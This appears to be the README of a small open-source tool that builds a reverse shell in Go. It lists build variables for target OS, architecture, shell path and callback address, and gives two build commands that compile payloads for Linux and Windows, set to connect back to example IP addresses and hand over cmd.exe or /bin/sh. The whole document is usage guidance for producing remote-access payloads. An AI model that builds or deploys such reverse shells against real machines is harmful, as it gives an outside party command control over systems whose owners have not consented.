# go-reverse-shell

A simple reverse shell written in Go.
Credits to [moloch](https://gist.github.com/moloch--/86068b6019ff5e3280725230dcafa892).

## Usage

| Variable      | Value                                                                                                                                        |
|---------------|----------------------------------------------------------------------------------------------------------------------------------------------|
| `GOARCH`      | one of `386`, `amd64`, `arm`, `arm64`, `mips`, `mipsle`, `mips64`, `mips64le`, `ppc64`, `ppc64le`,`s390x`                                    |
| `GOOS`        | one of `aix`, `android`, `darwin`, `dragonfly`, `freebsd`, `illumos`, `js`, `linux`, `netbsd`, `openbsd`, `plan9`, `solaris`, `windows`      |
| `shell`       | file path, e.g. `/bin/sh`, `/bin/bash`, `C:\\Windows\\System32\\cmd.exe` or `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` |
| `destination` | any `ip:port` combination, e.g. `192.168.1.1:1337`                                                                                           |

~~~ sh
./build.sh GOARCH=arm GOOS=linux SHELL=/bin/sh DESTINATION=1.2.3.4:5678
./build.sh GOARCH=amd64 GOOS=windows SHELL=C:\\Windows\\System32\\cmd.exe DESTINATION=5.6.7.8:4321
~~~
